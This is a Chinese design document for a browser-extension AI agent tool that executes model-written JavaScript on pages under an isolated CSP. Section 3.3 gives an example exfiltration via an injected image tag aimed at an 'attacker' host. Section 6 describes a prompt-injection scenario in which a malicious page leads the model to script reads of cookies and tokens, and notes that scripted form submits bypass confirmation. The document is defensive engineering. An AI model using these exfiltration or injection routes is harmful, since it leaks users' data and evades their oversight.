# 恢复 JS 执行能力：`browser_run_script`

- 日期：2026-10-02
- 来源：用户需求"插件增加 JS 代码执行能力"。用户在 brainstorming 中依次确认：商店正式版也带（重新申请 `userScripts`）；自动放行、不逐次确认；只在 `USER_SCRIPT` world 运行并用 CSP 禁止网络外发
- 推翻的决策：`92b9cba fix: remove user scripts from store release`（2026-07-28，1.1 重新上架时删除 `browser_inject_script` 与 `userScripts` 权限）
- 状态：待评审
- 依赖：新增权限 `userScripts`；新增工具 `browser_run_script`；新增消息类型 `RUN_SCRIPT`；`ActivityStep` 新增一个可选字段

## 1. 问题

结构化工具（`browser_modify_dom` / `browser_set_style` / `browser_fill_form` / 各类读取工具）覆盖了常见操作，但有一类请求它们拼不出来，或者要拼几十次调用：

- 批量提取：把表格/列表里几百行整理成 JSON 或 CSV。
- 批量改造：给页面上所有满足某条件的元素加标记、隐藏、改写文本。
- 计算型问题：统计页面上某类元素的数量、按条件筛选、求和。

一段几行的 DOM 脚本一次就能完成。旧版 `browser_inject_script` 正是为此存在，删除它是为了上架，不是因为需求消失。

## 2. 目标与非目标

**目标**

- 模型可以在当前操作目标标签页运行一段 JS，读写 DOM，并拿回一个可序列化的结果。
- 商店正式版可用，走 Chrome 官方的 `chrome.userScripts.execute()`，不使用 `eval` / `new Function`。
- 脚本所在 world 由扩展设置 CSP，禁止脚本直接发起网络请求。
- 合规文案、隐私政策、守卫测试如实反映新能力。

**非目标**

- 不访问页面自己的 JS 全局变量或函数（不提供 `MAIN` world）。
- 不做逐次确认（用户决定，见 §6 风险接受）。
- 不做静态危险 API 扫描（理由见 §3.3）。
- 回放时不直接重跑录下的代码（§3.6）。

## 3. 设计

### 3.1 工具契约

`browser_run_script`，参数：

| 参数 | 类型 | 说明 |
|---|---|---|
| `code` | string，必填，≤ `MAX_SCRIPT_CODE_CHARS`（20,000） | 函数体。外层包成 async 函数，可直接 `await`，用 `return` 返回结果 |
| `purpose` | string，必填，≤ 200 字 | 一句话说明脚本做什么；显示在活动步骤时间线，记入轨迹与导出 |
| `timeoutMs` | number，可选 | 默认 `DEFAULT_SCRIPT_TIMEOUT_MS`（5,000），钳制到 `[100, MAX_SCRIPT_TIMEOUT_MS]`（30,000） |

工具描述要告诉模型三件事：只能读写 DOM，看不到页面 JS 变量；网络请求会被拒绝；能用结构化工具完成的操作优先用结构化工具（填表必须走 `browser_fill_form`，因为只有它做写入校验和敏感字段拦截）。

### 3.2 执行链路

```
tools.ts  browser_run_script
  → messaging RUN_SCRIPT { tabId, code, timeoutMs }
  → background.ts handleMessage
      ensureScriptWorld()          // 每次 worker 启动后首次调用时 configureWorld，之后缓存
      userScripts.execute({ target: { tabId }, world: 'USER_SCRIPT', js: [{ code: wrapScript(code) }] })
      Promise.race(执行, 超时)
  → run-script.ts formatScriptResult  // 脱敏 → 截断 → 不可信内容前缀
```

- `tabId` 是本轮固定的操作目标，与其他工具相同；不支持 frame 选择，只跑顶层 frame。
- `wrapScript` 把模型代码包成 `(async () => { <code> })()`，再在外层做 `JSON.stringify`（带循环引用替换器，`undefined` 记为 `null`，函数/DOM 节点转成简短描述），**在页面里就转成字符串**再返回。这样 background 拿到的永远是字符串，不受结构化克隆失败的影响。代码抛出的异常同样在外层捕获，返回 `{ ok: false, error }` 形状的字符串，不让 `execute` 自己 reject。
- `userScripts.execute` 会等待返回的 Promise 结算（2026-10-02 实测：§5.3 第 3 项的 500ms 延迟 Promise 返回 1）。超时由 background 的 `Promise.race` 实现：超时后工具报失败，但**页面里的脚本无法被中止**，一个 `while (true)` 会一直占着那个页面。这是 `execute` API 的限制，工具描述里提醒模型不要写无界循环。
- `world` 写死为 `'USER_SCRIPT'`，不暴露给模型。

### 3.3 CSP 与外发边界

`lib/agent/script-world.ts` 导出常量：

```ts
export const SCRIPT_WORLD_CSP =
  "default-src 'none'; script-src 'self'; connect-src 'none'; img-src 'none'; media-src 'none'; frame-src 'none'; form-action 'none'";
```

`ensureScriptWorld()` 调用 `userScripts.configureWorld({ csp: SCRIPT_WORLD_CSP, messaging: false })`。

这道 CSP 管的是**脚本 world 自己发起的请求**：`fetch` / `XMLHttpRequest` / `WebSocket` / `EventSource` / `navigator.sendBeacon`。它是比静态扫描强得多的边界。静态扫描面对 `window['fe' + 'tch']` 这类写法无能为力，所以不做（旧版 `lib/security.ts` 与 acorn 依赖不恢复）。

**已知缺口（必须在 §5.3 手动验证并如实记录结果）：** 脚本和页面共享 DOM。脚本往页面里插入 `<img src="https://attacker/?d=...">`、改 `location.href`、调用 `window.open`，这些请求或导航很可能由**页面的** CSP 而不是 world CSP 管辖，因此不一定被拦住。也就是说 world CSP 堵住了直接的网络 API，但不是完整的数据外发边界。这一点写进 §6，不在文案里宣称"无法外发"。

### 3.4 权限分级与运行时约束

- 加入 `permissions.ts` 的 `AUTO_APPROVE_TOOL_NAMES`，因此也进 `WRITE_TOOL_NAMES`：计入写预算，触发执行遮罩与接管检测，执行后要求 `report_task_outcome`。
- 受 `tab-access.ts` 约束：`access: 'read'` 的标签页一律拒绝。
- 不进 `PAGE_LOCATION_TOOLS`；不参与表单提交探测（不归 `confirm_always`，用户决定）。
- 写入后与其他写工具一样，由 `background.ts` 重新采集字段表，`fieldId` 按元素身份继承（`field-id-allocation.ts` 不变）。
- `DENY_TOOL_NAMES` 中的 `browser_eval_raw` 保留。

### 3.5 "允许用户脚本"开关未开启

Chrome 138+ 要求用户在扩展详情页手动开启"允许用户脚本"，未开启时调用 `userScripts` 的方法会抛错。

- 工具始终在工具表里，不按开关状态增减（避免模型因工具时有时无改用其他工具硬凑）。
- background 在 `ensureScriptWorld()` 里用 try/catch 探测可用性。不可用时工具返回失败，文案（`SCRIPT_API_UNAVAILABLE_ERROR`）告诉模型：脚本能力未启用，改用结构化工具完成，并在最终回答里提示用户可以在扩展设置里开启。
- `ActivityStep` 新增可选字段 `hint?: 'enable_user_scripts'`，`run-registry.ts` 在该工具以上述错误失败时写入。面板在这一步下方渲染一行提示和"打开扩展设置"按钮，点击后 `browser.tabs.create({ url: 'chrome://extensions/?id=' + browser.runtime.id })`。文案中英两份走 `lib/i18n/`。

### 3.6 结果、轨迹与导出

- **结果**：页面里得到的 JSON 字符串先 `redactText`，再按 `resolveReadMaxChars`（默认 `DEFAULT_READ_MAX_CHARS`）截断，最后加上不可信页面内容前缀。顺序固定为先脱敏后截断，原因同 `page-outline.ts`：先截断会把敏感串切成两半，导致脱敏正则匹配不上。
- **轨迹**：成功的调用作为 `TrajectoryStep` 记录，只存 `purpose`（先 `redactText` 再截断）和代码长度，不存代码。`describeTrajectoryStep` 渲染为"运行脚本：<purpose>"。回放时模型按 purpose 重新生成脚本，因为录下的代码往往依赖原站点的结构，与"保存的任务不绑定页面"的约定一致。
- **导出**：`code` 与 `purpose` 加入 `KEPT_WRITE_ARG_KEYS`（经 `redactText`、按 `MAX_ARG_STRING_CHARS` 截断）。代码由模型生成，不是用户数据；排查问题时需要看它。

### 3.7 Manifest 与合规文案

| 文件 | 改动 |
|---|---|
| `wxt.config.ts` | permissions 加 `userScripts`；`minimum_chrome_version` 维持 138 |
| `docs/chrome-store-permission-justifications.md` | 新增 `userScripts` 节（中英）：用户请求的页面批量提取与改造；自动执行，不逐次确认；在隔离的 USER_SCRIPT world 中运行，CSP 禁止脚本发起网络请求；需要用户在扩展详情页开启"允许用户脚本"。`scripting` 节删去"不执行 AI 生成的 JavaScript"，改为"随扩展打包的函数走 scripting，AI 生成的脚本走 userScripts" |
| `docs/privacy-policy.md` / `.en.md` | 补一段脚本执行说明；生效日期改为发布日 |
| `lib/final-review.test.ts:79-80`、`.github/workflows/deploy-pages.yml:69-70` | 生效日期跟着改，否则 CI 挡住 Pages 部署 |
| `docs/chrome-store-listing.*.md` | 功能描述加一句 |
| `docs/chrome-store-submission-guide.md` | 权限清单去掉"不包含 `userScripts`" |
| `CLAUDE.md` | 工具清单、manifest 权限列表、安全边界、守卫测试描述 |

## 4. 模块划分

| 模块 | 职责 | 依赖 |
|---|---|---|
| `lib/agent/script-world.ts` | `SCRIPT_WORLD_CSP` 常量；`ensureScriptWorld(deps)`（注入 `configureWorld`，缓存成功状态，捕获不可用） | 无 |
| `lib/agent/run-script.ts` | `parseRunScriptParams`（钳制）、`wrapScript`、`formatScriptResult`（脱敏→截断→前缀）、`runScript(deps)`（注入 `execute` 与计时器，处理超时与失败文案） | `context-budget.ts`、`redaction.ts` |
| `lib/messaging.ts` | `RUN_SCRIPT` 类型与 payload/result | — |
| `entrypoints/background.ts` | 只做 I/O 编排：把 `browser.userScripts` 注入 `runScript` | 上两者 |
| `lib/agent/tools.ts` | 注册工具 | — |

纯逻辑全部放 `lib/`，原因照旧：没有 vitest project 匹配 `entrypoints/**/*.test.ts`。

## 5. 测试

### 5.1 守卫测试 `lib/final-review.test.ts`

改写 "does not request userScripts" 这一条为新的不变量：

- manifest 包含 `userScripts`。
- 工具表含 `browser_run_script`，不含 `browser_eval_raw` / `browser_inject_script`。
- `SCRIPT_WORLD_CSP` 含 `connect-src 'none'` 与 `default-src 'none'`。
- `entrypoints/background.ts` 源码中 `userScripts.execute` 调用处 `world: 'USER_SCRIPT'`，且全仓库 `entrypoints/`、`lib/` 非测试代码不出现 `new Function(` / `eval(`。

### 5.2 单元测试

- `run-script.test.ts`：参数钳制；`wrapScript` 的输出在 node 下 `new Function` 执行后能正确序列化循环引用、`undefined`、抛错（只在测试里这样做）；先脱敏后截断（构造一个跨截断点的手机号）；超时；API 不可用的失败文案。
- `script-world.test.ts`：只 configure 一次；`configureWorld` 抛错时返回不可用且下次重试。
- `permissions.test.ts`：`auto_allow`；`tab-access` 只读标签页拒绝。
- `conversation-export.test.ts`：现有守卫自动覆盖新参数，断言 `code` 被保留且经脱敏。
- `trajectory-recorder` 测试：记录 purpose 与代码长度，不含代码。
- `activity-steps` / 面板：`hint` 渲染按钮（ui project）。

### 5.3 手动验证（真实 Chrome 138+，加载 `.output/chrome-mv3`）

1. 开关关闭：工具失败、面板出现提示与按钮，按钮打开扩展详情页。
2. 开关打开：提取一个表格为 JSON；批量隐藏一类元素。
3. `return await new Promise(r => setTimeout(() => r(1), 500))` 返回 1（确认 `execute` 等待 Promise）。
4. 脚本内 `fetch('https://example.com')` 被拒绝。
5. 脚本插入 `<img src="https://example.com/x.png">`、设置 `location.href`：记录是否被拦，结果写回本文 §3.3 与 §6。
6. 在一个强 CSP 站点（如 GitHub）上运行脚本，确认 user script 不受页面 CSP 的 `unsafe-eval` 限制。
7. 脚本内 `form.requestSubmit()` / 点击提交按钮：记录 world CSP 的 `form-action 'none'` 是否拦住。不拦则脚本触发的提交绕过逐次确认（文案已如实说明，见 §6）。

## 6. 风险接受

用户在评审中明确选择了自动放行。剩余风险如下，记录在此，不再重新讨论：

- **提示注入**：恶意页面可以诱导模型生成读取 `document.cookie`（非 HttpOnly 部分）、localStorage token 等页面数据的脚本。没有人工确认环节。
- **表单提交**：脚本可以 `requestSubmit()` 或点击提交按钮，不经过 `confirm_always` 的逐次确认（工具描述要求填表与提交走结构化工具，但这只是对模型的约束）。合规文案已据此限定"检测到的表单提交"的范围。
- **外发**：world CSP 拦住直接网络 API；借页面 DOM 发起的资源请求和导航可能不被拦（§3.3，以 §5.3 第 5 项结果为准）。读到的数据还会作为工具结果进入模型上下文，经 `redactText` 处理，与其他读取工具同级。
- **商店审核**：权限说明如实写"自动执行"。如果审核要求逐次确认，回退方案是把工具移到 `confirm_always`，确认卡片展示 `purpose` 与代码，其余设计不变。
